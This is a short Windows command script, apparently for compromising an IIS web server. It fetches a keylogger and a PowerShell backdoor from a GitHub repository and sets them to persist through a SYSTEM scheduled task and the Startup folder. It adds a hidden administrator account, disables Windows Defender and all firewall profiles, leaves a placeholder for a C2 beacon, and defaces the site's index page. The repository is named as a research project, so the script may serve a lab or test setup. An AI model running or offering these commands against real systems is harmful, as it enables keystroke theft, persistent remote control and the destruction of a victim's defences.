# install python and python keylogger
curl https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe -o python-installer.exe
python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
pip install pynput
curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%20Server%202022%20IIS/klogger.py" -OutFile "C:/Windows/System32/config/klogger.pyw"
powershell -Command "Register-ScheduledTask -TaskName 'PyBgTask' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Python312\pythonw.exe' -Argument 'C:\Windows\System32\config\klogger.pyw') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force"

# add malicious user
net user john password /add
net localgroup Administrators john /add

# download powershell backdoor to startup folder
curl "https://raw.githubusercontent.com/cleverbear57/AI-Research-Project/refs/heads/main/Windows%20Server%202022%20IIS/shl.ps1" -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shl.ps1"

# disable windows defender and real-time protection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

# disable all firewall profiles
netsh advfirewall set allprofiles state off

# install silver beacon

# deface website
echo "YOU HAVE BEEN HACKED!!!" > "C:\inetpub\wwwroot\index.php"
